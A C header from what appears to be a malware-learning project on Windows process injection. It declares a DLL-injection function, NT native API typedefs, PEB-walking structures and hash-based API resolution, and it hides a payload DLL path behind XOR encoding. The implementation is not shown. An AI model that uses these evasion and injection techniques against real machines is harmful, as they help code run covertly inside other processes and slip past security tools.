#pragma once
#include <windows.h>


static const WCHAR g_enc_path[] = {
    0x11, 0x6F, 0x09, 0x18, 0x34, 0x39, 0x09, 0x19, 0x30, 0x34, 0x27, 0x3B, 0x09, 0x05, 0x27, 0x3A,
    0x36, 0x30, 0x26, 0x26, 0x1C, 0x3B, 0x3F, 0x30, 0x36, 0x21, 0x3C, 0x3A, 0x3B, 0x09, 0x11, 0x19,
    0x19, 0x75, 0x1C, 0x3B, 0x3F, 0x30, 0x36, 0x21, 0x3C, 0x3A, 0x3B, 0x09, 0x25, 0x34, 0x2C, 0x39,
    0x3A, 0x34, 0x31, 0x67, 0x7B, 0x31, 0x39, 0x39,
    0x00
};

#define XOR_KEY 0x55

inline void decrypt_path(WCHAR* out, SIZE_T max_len) {
    for (SIZE_T i = 0; i < max_len && g_enc_path[i] != 0; i++) {
        out[i] = g_enc_path[i] ^ XOR_KEY;
    }
    out[max_len - 1] = 0;
}


typedef struct { USHORT a; USHORT b; PWSTR c; } S_UNI, *PS_UNI;
typedef struct { ULONG a; VOID* b; PS_UNI c; ULONG d; VOID* e; VOID* f; } S_OBJ, *PS_OBJ;
typedef struct { HANDLE a; HANDLE b; } S_CID, *PS_CID;


typedef NTSTATUS(NTAPI* F_OPN)(PHANDLE, ACCESS_MASK, PS_OBJ, PS_CID);
typedef NTSTATUS(NTAPI* F_ALC)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* F_WRT)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* F_LDR)(PCWSTR, PULONG, PS_UNI, PVOID*);
typedef NTSTATUS(NTAPI* F_THR)(PHANDLE, ACCESS_MASK, PS_OBJ, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* F_WAT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI* F_CLS)(HANDLE);
typedef NTSTATUS(NTAPI* F_FRE)(HANDLE, PVOID*, PSIZE_T, ULONG);
typedef NTSTATUS(NTAPI* F_QRY)(ULONG, PVOID, ULONG, PULONG);


typedef struct { BYTE a[8]; PVOID b[3]; LIST_ENTRY c; } S_LDR, *PS_LDR;
typedef struct { PVOID a[2]; LIST_ENTRY b; PVOID c[2]; PVOID d; PVOID e[2]; PS_UNI f; } S_ENT, *PS_ENT;
typedef struct { BYTE a[2]; BYTE b; BYTE c[1]; PVOID d[2]; PS_LDR e; } S_PEB, *PS_PEB;


PVOID get_base(HMODULE h);
PVOID resolve(HMODULE h, DWORD hash);
BOOL inject(DWORD pid, LPCWSTR path, SIZE_T size);